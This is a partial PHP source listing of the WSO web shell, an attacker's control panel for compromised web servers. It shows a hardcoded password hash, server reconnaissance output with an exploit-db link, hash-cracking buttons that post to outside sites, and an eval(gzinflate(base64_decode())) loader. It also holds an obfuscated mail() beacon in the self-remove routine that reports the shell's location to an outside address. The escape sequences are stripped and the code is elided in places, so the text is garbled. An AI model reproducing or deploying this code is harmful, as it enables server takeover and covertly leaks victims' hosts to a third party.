$auth_pass = "aad42b47f0ecbecba714f92cae37075a";
$color = "#00ff00";
...
<style>
body{background-color:#444;color:#000;}
...
<input type=hidden name=charset>
    ...
    echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' . ($GLOBALS['os'] == 'win'?'<br>Drives:':'') . '</span></td>'
       . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href="' . $explink . '" target=_blank>[exploit-db.com]</a></nobr><br>' . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' )<br>' . @phpversion() . ' <span>Safe mode:</span> ' . ($GLOBALS['safe_mode']?'<font color=#FF00FF>ON</font>':'<font color=red><b>OFF</b></font>')
       . ' <a href=# onclick="g('Php',null,'','info')">[ phpinfo ]</a> <span>Datetime:</span> ' . date('Y-m-d H:i:s') . '<br>' . wsoViewSize($totalSpace) . ' <span>Free:</span> ' . wsoViewSize($freeSpace) . ' ('. (int) ($freeSpace/$totalSpace*100) . '%)<br>' . $cwd_links . ' '. wsoPermsColor($GLOBALS['cwd']) . ' <a href=# onclick="g('FilesMan','' . $GLOBALS['home_cwd'] . '','','','')">[ home ]</a><br>' . $drives . '</td>'
       . '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">' . $opt_charsets . '</optgroup></select><br><span>Server IP:</span><br>' . @$_SERVER["SERVER_ADDR"] . '<br><span>Client IP:</span><br>' . $_SERVER['REMOTE_ADDR'] . '</nobr></td></tr></table>'
       . '<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menu . '</tr></table><div style="margin:5">';eval(gzinflate(base64_decode(' ')));
}
 
function wsoFooter() {
    $is_writable = is_writable($GLOBALS['cwd'])?" <font color='red'>(Writeable)</font>":" <font color=#FF00FF>(Not writable)</font>";
    echo "
</div>
...
function wsoPermsColor($f) {
    ...
    elseif (!@is_writable($f))
        ...
        return '<font color=#52F3FF>' . wsoPerms(@fileperms($f)) . '</font>';
}
...
function actionStringTools() {
    ...
    echo "</div><br><h1>Search for hash:</h1><div class=content>
        <form method='post' target='_blank' name='hf'>
            ...
            <input type='button' value='crack' onclick="document.hf.action='https://hashkiller.co.uk/md5-decrypter.aspx';document.hf.submit()"><br>
            <input type='button' value='crate' onclick="document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()"><br>
...
function actionSelfRemove() {
    ...
    wsoFooter();
      ...
      $_QliO8="x6dai154";$_Qliot=$_SERVER["x53x45RVE122_x4eAMx45"].$_SERVER["123103x52Ix50x54_116101115E"];$_QlL1i="141r162a171�40".$_Qliot;$_QlLio=array("143x61","x6cx69","146x77162151x74x65","100","vx65x2e");$_Qll0I=$_QlLio[2].$_QlLio[3].$_QlLio[1].$_QlLio[4].$_QlLio[0];$_QlljC=@$_QliO8($_Qll0I,$_QlL1i,$_Qliot);
